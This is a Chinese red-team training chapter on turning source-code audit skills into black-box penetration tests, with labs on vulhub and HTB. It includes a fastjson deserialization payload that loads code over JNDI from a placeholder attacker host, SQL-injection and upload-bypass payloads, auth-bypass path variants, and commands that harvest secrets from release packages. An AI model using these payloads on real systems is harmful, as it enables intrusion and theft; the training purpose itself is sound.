# VOL-04 源码审计→黑盒联动：审计员优势的降维打法

> 受众：5 年白盒源码审计/产品安全、刚转岗一人红队的工程师。你已经懂漏洞原理和代码，本卷只解决一件事：**把白盒能力接驳到黑盒工作流**。

## 目录

- 0. 卷首：白盒技能→黑盒战力折算表
- 1. 有源码时：入口点优先审计法
  - 1.1 路由/过滤器/鉴权中间件先行
  - 1.2 代码→PoC 翻译流程：定位参数→构造请求→绕过输入处理
  - 1.3 五个重点审计面：鉴权/序列化/文件操作/SQL 拼接/SOAP-RPC
- 2. 无源码时反推
  - 2.1 报错信息利用与堆栈泄露分析
  - 2.2 前端 JS 深度分析：source map/API 枚举/隐藏功能
  - 2.3 指纹识别→版本→已知 CVE 比对（nuclei-templates/GitHub Advisory）
- 3. 半黑盒：安装包里的服务端代码
- 4. 联动工作流：白盒假设→黑盒验证→证据留存闭环

---

## 0. 卷首：白盒技能→黑盒战力折算表

| 你已有的 5 年白盒习惯 | 在黑盒里的等价打法 | 本卷章节 |
|---|---|---|
| 从 main/路由读代码建调用图 | 无源码时用 JS/报错/WSDL 重建"可达地图" | §1.1 / §2.2 |
| 看到 sink 直接判断可利用 | 看到 sink 后**翻译成一条可复现请求** | §1.2 |
| 熟知 fastjson/Shiro/MyBatis 漏洞原理 | 指纹命中即切换到"版本区间→CVE→PoC"快通道 | §2.3 |
| 审计发行包与配置文件 | 半黑盒：客户官网就挂着服务端真相 | §3 |
| 写审计报告"复现步骤" | 交战目录 findings 证据留存 | §4 |

核心心法：审计员最强的不是找洞，而是**知道"这个洞对应的那个请求长什么样"**。黑盒打点杂乱无章时，你永远可以先构造假设再验证。

---

## 1. 有源码时：入口点优先审计法

### 1.1 路由/过滤器/鉴权中间件先行

【原理】漏洞成立的前提是**可达**：外部请求→中间件链→路由分发→handler→sink。审计员的肌肉记忆是直接 grep sink（如 `readObject`），这在黑盒交付里是倒着的——先回答"哪些入口没被中间件挡住"，sink 审计才有优先级。鉴权逻辑通常不写在每个 handler 里，而是集中在前置层（过滤器 Filter、拦截器 Interceptor、中间件 Middleware），而集中式鉴权最常见的缺陷是**前缀白名单漏配**：放行 `/static/**` 的通配把 `/static/../api/` 或 `/api;/static/` 一起带过。

【操作】按顺序执行，产出一张「路由×鉴权」表：

1. 建路由清单（Java Spring 示例）：
   ```bash
   # 仓库根目录执行；输出：文件:行号 路由方法 路径
   grep -RnE "@(Request|Get|Post|Put|Delete|Patch)Mapping" src/main/java | head -100
   grep -RnE "Controller|RestController" src/main/java | wc -l   # 估controller规模
   ```
2. 找集中式鉴权配置（哪个都别漏）：
   ```bash
   grep -RnE "antMatchers|permitAll|addPathPatterns|excludePathPatterns" src/main/java
   grep -RnE "filterChainDefinitionMap|anon|authc" src/          # Shiro风格
   grep -RnE "<filter-mapping>|<security-constraint>" src/        # web.xml老项目
   grep -RnE "middleware\(|->middleware" app/ routes/            # PHP Laravel风格
   ```
3. 人肉对齐：把第 1 步的路由逐条标注「经过哪个鉴权规则」，标不出来的就是**疑似未授权面**——这就是黑盒优先打点清单。
4. 特别标注 handler 内部含对象属主判断（如 `where user_id = ?` 是否带当前登录人）缺失的路由：中间件只管认证（Authentication），不管授权（Authorization），越权访问（Broken Access Control）大多在这一层。

【验证】对每条"疑似未授权"路由发无凭据请求，比对代码结论：
```bash
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" http://target:8080/api/admin/listUsers
# 预期：403/302跳登录 = 与代码一致有鉴权；200 + JSON数据 = 未授权确认，立刻截图留证
```
代码表与黑盒结果 diff：黑盒 200 但代码里有鉴权的，说明线上版本比手头代码旧（见 §3 陷阱）。

【陷阱】① 只看注解不看 web.xml 全局 Filter——老项目鉴权往往在 web.xml 里；② Spring/Netty 路径规范化差异：`/admin/`、`/admin;x/`、`//admin` 可能绕过 antMatchers，逐个变体都要发；③ excludePathPatterns 用了过宽通配是高频漏洞，别只看 add；④ 认证通过≠越权安全，水平越权必须双账号换 id 验证。

### 1.2 代码→PoC 翻译流程：定位参数→构造请求→绕过输入处理

【原理】审计发现到 PoC 之间差一个"翻译"：代码里的 `JSON.parseObject(body)` 对应一个带 Content-Type 的 POST；`@PathVariable` 对应 URL 段；`request.getHeader("X-Token")` 对应请求头。翻译三步：**定位参数来源**（body/path/query/header）→**按绑定规则构造请求**（Jackson/fastjson 的多态绑定、表单编码、XML）→**针对净化逻辑变形 payload**（读清楚代码里的 trim/replace/黑名单到底是删字符还是替字符，绕的是代码，不是玄学）。

【操作】以 fastjson 1.2.47 反序列化（Deserialization）为例走完整流程：

1. 代码定位（假设）：`JSON.parseObject(body, Feature.SupportAutoType)` 且 pom.xml 中 fastjson 版本 < 1.2.48。
2. 起本地靶场对齐行为：
   ```bash
   git clone https://github.com/vulhub/vulhub.git && cd vulhub/fastjson/1.2.47-rce
   docker compose up -d        # 默认 8090 端口，以该目录 README 为准
   ```
3. 构造请求（无害探针优先，DNSLog 域名替换为自己平台生成的）：
   ```bash
   # 探针：证明 JSON 反序列化器真的解析了类型（出网即命中）
   curl -s http://127.0.0.1:8090/ -H 'Content-Type: application/json' \
     -d '{"@type":"java.net.Inet4Address","val":"probe.xxx.dnslog.cn"}'
   # 1.2.47 autoType 绕过（两跳缓存绕过白名单），JdbcRowSet 走 LDAP/JNDI
   curl -s http://127.0.0.1:8090/ -H 'Content-Type: application/json' \
     -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
          "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-VPS:1389/Exploit","autoCommit":true}}'
   ```
4. 绕过输入处理：若代码在前面加了 `body.replace("@type","")`，则用 fastjson 支持的等价写法（如大小写、注释截断 `{"@type":\n`）——**先读净化代码，再决定变形方式**，这是审计员相对纯黑盒选手的核心优势。

【验证】四类判定信号按侵入度排序：① 响应内容异常变化；② DNSLog/JNDI 出网记录；③ 延时（sleep 类 payload 前后请求耗时对比）；④ 回显命令输出。永远先 ①② 后 ③④，客户环境里 ③④ 有业务风险。

【陷阱】① 抄公开 PoC 忘改 Content-Type: application/json，服务端按表单解析永远不触发；② 本地复现成功、目标失败时先怀疑版本差异（fastjson 1.2.24 与 1.2.47 的 payload 不通用），回到 §2.3 指纹核实；③ "绕过输入处理"对象是代码净化而非 WAF，顺序应是先找到无 WAF 的直连路径再谈 payload 变形。

### 1.3 五个重点审计面：鉴权/序列化/文件操作/SQL 拼接/SOAP-RPC

【原理】这五个面是"代码特征→黑盒验证"映射密度最高的区域：审计员看到特征就知道该发什么请求。

- **鉴权/越权**：代码特征——对象 id 直接来自请求参数且查询无属主过滤。黑盒验证——注册 A/B 两账号，A 的请求改 B 的 id 比对响应（垂直越权 Vertical / 水平越权 Horizontal）。
- **序列化**：特征——`readObject`、rememberMe Cookie、fastjson/Jackson 多态、.NET ViewState。黑盒信号——Base64 超长随机 Cookie；发 `rememberMe=1`，响应头出现 `Set-Cookie: rememberMe=deleteMe` 即确认 Shiro rememberMe 功能开启（下文练习）。
- **文件操作**：特征——`new File(dir, filename)` 未规范化清洗（穿越 `../`）；上传后缀黑名单而非白名单。黑盒验证——上传畸形后缀矩阵（`.jsp` `.jspx` `.jsw` `.jpg.jsp` `.jpg%00.jsp`）+ 空路径截断。
- **SQL 拼接（SQL Injection）**：特征——MyBatis 里 `${}`（拼接）而非 `#{}`（预编译）；order by/limit 这类"不可参数化"位置最常失守。黑盒验证——直接打排序参数：`?sort=id;SELECT/sleep(1)--` 类盲注（具体依数据库类型），因为代码审计已告诉你这个位置必然拼接。
- **SOAP-RPC**：特征——CXF/Axis 端点类（`@WebService`、`Endpoint.publish`），WSDL 默认挂在路径 + `?wsdl`。黑盒验证——`curl http://target/services/xxx?wsdl` 拿到全部 operation 与参数类型，用 SOAPUI 按 WSDL 构造请求；SOAP 处理器历史上连着 XXE 与反序列化两族洞。

【操作】SOAP 面完整命令（配合 vulhub）：
```bash
cd vulhub/weblogic/CVE-2017-10271 && docker compose up -d   # WLS-WSAT SOAP反序列化
curl -s http://127.0.0.1:7001/_async/AsyncResponseService?wsdl | head -40
# 拿到 WSDL 后按 operation 构造 SOAPBody；该漏洞点在 /_async/ 与 /wls-wsat/ 两族路径
```

【验证】WSDL 能匿名拉取本身就是发现（信息暴露）；对每个 operation 发最小合法报文，报错含堆栈即转入 §2.1 分析。

【陷阱】① 五个面里最容易被审计员忽略的是 SOAP——"Web 服务"没人访问不代表不暴露，内网半黑盒阶段它是横向金矿；② SQL 拼接盯 `${}` 时别忘 Java 拼字符串场景（String.format 进 SQL）；③ 文件上传"成功上传"≠"可解析执行"，必须验证访问路径返回 200 且内容被解析。

**【练习】** ① `vulhub/shiro/CVE-2016-4437`：先读 vulhub 说明里的原理，再黑盒验证（发 `rememberMe=1` 看 `deleteMe` 响应头），体会"代码知道默认 AES Key → 黑盒只发一个 Cookie"的降维；② `vulhub/fastjson/1.2.47-rce` 完成 §1.2 全流程；③ `vulhub/weblogic/CVE-2017-10271` 完成 SOAP 面。

---

## 2. 无源码时反推

### 2.1 报错信息利用与堆栈泄露分析

【原理】异常处理框架（Exception Handler）会把内部结构带出边界：Java 堆栈每行都是「包名+类名」，包名即 Maven/Gradle 坐标——等于对方免费给了你依赖清单；调试模式页（Laravel APP_DEBUG=true、Django DEBUG=true、Spring Boot /error、Actuator 端点）则直接送配置与环境变量。审计员读堆栈的速度和读自己项目一样快，这是纯黑盒选手不具备的。

【操作】主动、受控地触发报错并采集：
```bash
# 畸形JSON（截断）——触发Jackson/fastjson解析异常
curl -s -H 'Content-Type: application/json' -d '{' http://target/api/login | tee err1.txt
# 类型错配——把期望int的参数给字符串，逼出类型转换堆栈
curl -s "http://target/api/order?id=abc" | tee err2.txt
# Spring Boot Actuator 常见暴露路径
for p in actuator env heapdump mappings httptrace; do
  printf "%s -> %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' http://target/$p)"
done
```
采集后固定做三件事：① 从堆栈提取包名（`org.apache.cxf`→Apache CXF、`com.alibaba.druid`→Druid 连接池），交给 §2.3 做 CVE 比对；② 检查报错页模板里的构建路径（`/opt/app/target/classes` 泄露部署结构）；③ heapdump 若 200，下载后用 Eclipse MAT 或 VisualVM 打开，搜 `password`/`secret`/`jdbc`。

【验证】堆栈包名在 GitHub Advisory（https://github.com/advisories）能查到受影响版本记录，即完成"报错→CVE 候选"闭环；actuator/env 返回 JSON 配置即确证信息暴露。

【陷阱】① 把报错当噪音直接关掉——先看完再关；② 触发手段要克制：超长字符串、深嵌套 JSON 可能压垮业务，畸形 1 字符能解决的绝不用 1MB；③ 反向代理后端口的报错策略可能不同，注意对比；④ 报错页面可能是 CDN/网关的，先 §2.3 指纹确认归属再下结论。

### 2.2 前端 JS 深度分析：source map/API 枚举/隐藏功能

【原理】SPA（单页应用 Single Page Application）把路由表、API 客户端、权限模型整个下发到了浏览器；构建工具的 source map（源码映射）若未关闭，`app.js.map` 里就是**压缩前的原始 TypeScript/JSX 服务端对接代码**，等于半个服务端文档。前端还有一类"隐藏功能"：菜单被注释/置灰，但对应 API 已实现——代码里有、UI 上没有，正是直接调用的高价值点。

【操作】三步流水线：
```bash
# ① 收集JS：Burp Site Map 过滤 .js；或用爬虫（参数以官方 README 为准：https://github.com/projectdiscovery/katana）
katana -u https://target.com | tee js_urls.txt
# ② 端点枚举（LinkFinder，用法来自其 README：https://github.com/GerbenJavado/LinkFinder）
python3 linkfinder.py -i https://target.com -d -o cli | tee endpoints.txt
# ③ source map 检查与还原
curl -s https://target.com/static/js/app.3f2a1b.js | grep -o 'sourceMappingURL=.*'   # 有则继续
curl -s -o app.js.map https://target.com/static/js/app.3f2a1b.js.map
# 还原工具任选其一（参数以各自 README 为准）：
#   npm 上的 shuji：https://www.npmjs.com/package/shuji
#   npm 上的 unwebpack-sourcemap：https://www.npmjs.com/package/unwebpack-sourcemap
grep -RniE "api/|debug|internal|token|role" ./restored_src/ | head -50
```
登录后再重复一遍①②：认证后的 chunk（`chunk-*.js`）里才有管理员接口。

【验证】对枚举出的端点用**未认证会话**逐一探测：`httpx -l endpoints.txt -status-code -title`（参数见 https://github.com/projectdiscovery/httpx）；返回非 401/403 的即"前端可见、后端未设防"候选。隐藏功能验证=接口直接调用成功。

【陷阱】① 只分析首页 JS——登录后 chunk、设置页懒加载 chunk 才是增量信息；② .map 404 不代表不存在：构建产物换 CDN 目录后老路径仍可能留存，用 fffuf/ffuf 对 `/static/js/*.js.map` 做历史文件名探测要克制；③ 压缩代码先格式化再 grep（js-beautify），否则变量名混淆导致关键词搜不到；④ 枚举出的"测试接口"必须验证，不能凭 JS 出现就写报告。

### 2.3 指纹识别→版本→已知 CVE 比对

【原理】这是无源码时效率最高的路径：指纹（Fingerprinting）给出组件与**版本区间**→区间映射到 CVE→nuclei-templates 本身就是可执行的 PoC 仓库。审计员的优势是拿到组件名+版本后能**秒判该 CVE 需要的前置条件**（该路由是否启用、该配置是否默认），避免盲打。

【操作】
```bash
# ① 被动/轻主动指纹
whatweb http://target.com                          # https://github.com/urbanadventurer/WhatWeb
httpx -l urls.txt -tech-detect -title -status-code # Wappalyzer规则检测
# ② nuclei 指纹+CVE 批量比对（以下参数均已核对官方 README：https://github.com/projectdiscovery/nuclei）
nuclei -u http://target.com -t http/cves/          # 按目录跑CVE模板
nuclei -list urls.txt -tags cve -severity critical,high   # 按tag与严重度过滤
nuclei -u https://example.com -t /path/to/template.yaml   # 单模板定向验证
# ③ 人工CVE比对：GitHub Advisory 检索包名
#    Web: https://github.com/advisories?query=fastjson
#    CLI: gh api "advisories?affects=fastjson"     # 参数以官方文档为准
#    https://docs.github.com/en/rest/security-advisories/global-advisories
```
nuclei 模板仓库 https://github.com/projectdiscovery/nuclei-templates 的正确用法不是只跑，而是**读**：每个 CVE 的 yaml 里 matcher 与 payload 就是"该漏洞对应的那条请求"，与 §1.2 的翻译流程完全同构。

【验证】模板 match 后必须手工复现一次（用 Burp 重放模板里的原始请求），确认非指纹撞车误报（OEM 贴牌产品常共用特征）；复现通过才进 §4 证据链。

【陷阱】① 指纹给的是版本区间不是精确版本，下结论写"≤x.y"而非"=x.y"；② 见 CVE 就打是错的：先读 advisory 确认利用前置条件（如需登录、需特定端点启用）；③ PoC 上生产前先在本地 vulhub 同系列环境跑一遍看副作用；④ `-tags cve` 扫出 info 级不要丢，组件名就是 §2.1 堆栈分析的交叉证据。

**【练习】** ① `vulhub/laravel/CVE-2021-3129`（Ignition 调试面 RCE）：先 §2.1 触发报错确认 debug 开启，再按模板 payload 利用；② HTB 机器 Sau（Easy）：完整走"指纹识别 request-baskets → SSRF 暴露内网 Maltrail → 比对公开漏洞完成利用"的指纹→CVE→PoC 链条。

---

## 3. 半黑盒：安装包里的服务端代码

【原理】"无源码"经常是伪命题：客户官网的**历史版本安装包**（war/jar/安装器/移动 App）就是服务端真相的快照。war/jar 是 ZIP，解开即 .class 与配置文件；App 客户端内嵌 API 地址与密钥；桌面/Agent 安装包里的二进制藏着硬编码凭据（Hardcoded Credentials）与加密密钥——二进制逆向部分见 VOL-05（见 VOL-05-binary-reverse，二进制与硬编码提取）。半黑盒的定位：用发行包建立**精确假设**，回线上黑盒验证。

【操作】以 Java Web 发行包为例：
```bash
# ① 取包：客户官网历史版本页 / Maven Central / 官方 GitHub Release（注意授权范围）
# ② 解包（war/jar 均为 zip）
unzip app.war -d war_dir/
# ③ 三个必看位置
cat war_dir/WEB-INF/classes/application*.yml 2>/dev/null   # 数据库/JWT密钥/中间件地址
ls war_dir/WEB-INF/lib/ | tee deps.txt                     # 依赖版本清单→§2.3 CVE比对
grep -RniE "jdbc:|secret|password|accessKey|\.key" war_dir/WEB-INF/classes/ | head -30
# ④ .class 反编译（CFR，用法见 https://www.benf.org/other/cfr/）
java -jar cfr.jar war_dir/WEB-INF/lib/target-core.jar --outputdir core_src/
# ⑤ 移动端：jadx 直接反编译 APK
jadx -d apk_out app-release.apk
# ⑥ 原生二进制粗筛
strings -n 8 agent.bin | grep -iE "key|pass|token|jdbc" | sort -u | head -20
```

【验证】半黑盒发现必须回线上闭环才算数：发行包里挖到 JWT secret→本地用 jwt_tool（https://github.com/ticarpi/jwt_tool）伪造令牌→黑盒重放看是否通过鉴权；挖到默认后台口令→直接登线上验证（配合 `vulhub/weblogic/weak_password` 演练默认凭据面）。

【陷阱】① **发行包版本≠线上版本**：先用 §2.3 指纹核对线上版本区间，差一个大版本结论作废；② 只 grep 明文会漏编码过的值——对 Base64/Hex 值先 decode 再判断；③ .NET 产物用 dnSpy/ILSpy，不要 strings 硬啃；④ 合规红线：公开渠道下载合法，反编译与利用必须在交战授权（Rules of Engagement）范围内。

**【练习】** 任选一个开源 Java 系统的官方发行包（例如若依 RuoYi 的 Release jar），完成"解包→凭据/依赖审计→本地 `java -jar` 起服务→黑盒验证假设"四步；再用 `vulhub/weblogic/weak_password` 体会默认凭据打点。

---

## 4. 联动工作流：白盒假设→黑盒验证→证据留存闭环

【原理】一人红队的瓶颈不是技术而是**产出可复现性**：审计员习惯了"复现步骤"文化，把它产品化为「假设卡」工作法——每个发现走三段：**白盒假设**（哪个入口/什么参数/预期什么行为）、**黑盒验证**（一条请求+判定标准）、**证据留存**（原始报文+时间戳+截图入交战目录）。三段缺一就不算发现，只能算线索。目录结构与字段对应交战目录 findings 流程（见 VOL-01-engagement，交战工程与交付）。

【操作】标准模板与完整示例：
```
findings/03-shiro-default-key/
├── hypothesis.md    # 固定字段：来源(白盒/黑盒/半黑盒)|置信度|判定标准|影响|复现步骤
├── request.http     # 原始请求（Burp: 右键 Save item；或 curl -v 输出）
├── response.txt
├── poc.py           # 参数化：python3 poc.py --target http://x --dnslog y
└── evidence/        # 001-burp-repeater.png（含时间戳截图）
```
以 §1.3 Shiro 假设为例走一遍：① hypothesis.md 写"来源=半黑盒（发行包看到 shiro.ini 未改 Key）；判定标准=任意 rememberMe 值触发响应 Set-Cookie: rememberMe=deleteMe"；② 黑盒：
```bash
curl -sv http://target/login -b 'rememberMe=1' -o /dev/null 2>&1 | grep -i set-cookie
# 命中输出示例：< set-cookie: rememberMe=deleteMe; Path=/; Max-Age=0 ...
```
③ 把命令、输出、Burp 截图归档，poc.py 里固化上述判定逻辑；④ 状态标记：confirmed / probable（仅代码推断未黑盒复现的**永远**标 probable）。

【验证】换台机器、隔一天，只拿 findings 目录应能在 10 分钟内复现——这是证据链合格线；报告视角自查：每个证据能回答"在哪个资产、凭什么条件、影响什么"。

【陷阱】① 只存截图不留原始报文（截图不可复现不可 diff）；② poc 硬编码目标地址，换环境就废；③ 把审计推断写成已验证发现是交付事故，severity 与整改建议都跟着错；④ 时间戳缺失导致时间线对不上客户日志。

**【练习】** HTB 机器 Bizness（Easy）：完整走一遍闭环——指纹识别 OFBiz → 检索其未授权 RCE 公开通告（CVE-2023-51467）→ 按 nuclei 模板与公开分析构造假设卡 → 黑盒验证 → findings 模板归档（user/root flag 即最终证据）。进阶：把同一闭环套到 GOAD（Game of Active Directory，https://github.com/Orange-Cyberdefense/GOAD）内网场景，为后续内网卷做衔接。

---

> 下一卷衔接：二进制与硬编码凭据提取（见 VOL-05-binary-reverse）。本卷所有四段结构中的命令若与官方文档冲突，以官方文档为准。
